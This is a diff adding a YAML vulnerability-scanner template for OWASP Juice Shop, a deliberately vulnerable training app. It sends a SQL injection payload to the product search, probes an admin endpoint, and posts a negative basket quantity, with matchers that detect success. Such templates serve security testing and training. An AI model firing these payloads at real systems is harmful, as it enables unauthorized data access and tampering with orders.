@@ -1,0 +1,54 @@
+id: juice-shop-business-logic
+info:
+  name: OWASP Juice Shop Business Logic Flaws
+  author: Bughunter
+  severity: high
+  description: Checks for specific business logic flaws in OWASP Juice Shop (SQLi, Admin exposure, Negative Basket).
+  tags: dast,fuzzing,sqli,bola,juice-shop
+
+requests:
+  - raw:
+      # 1. SQL Injection on Products Search
+      - |
+        GET /rest/products/search?q=1'))%20OR%201=1-- HTTP/1.1
+        Host: {{Hostname}}
+
+      # 2. BOLA / Admin Exposure
+      - |
+        GET /rest/admin/application-version HTTP/1.1
+        Host: {{Hostname}}
+
+      # 3. Negative Basket Quantity
+      - |
+        POST /api/BasketItems/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"ProductId":1,"BasketId":"1","quantity":-100}
+
+    matchers-condition: or
+    matchers:
+      # SQLi Matcher
+      - type: word
+        name: juice-shop-sqli
+        part: body
+        words:
+          - 'Apple Juice'
+          - 'Apple Pomace'
+        condition: and
+
+      # Admin Exposure Matcher
+      - type: word
+        name: juice-shop-admin-exposure
+        part: body
+        words:
+          - '"version":'
+        condition: and
+        
+      # Negative Basket Matcher
+      - type: word
+        name: juice-shop-negative-basket
+        part: body
+        words:
+          - '"quantity":-100'
+        condition: and
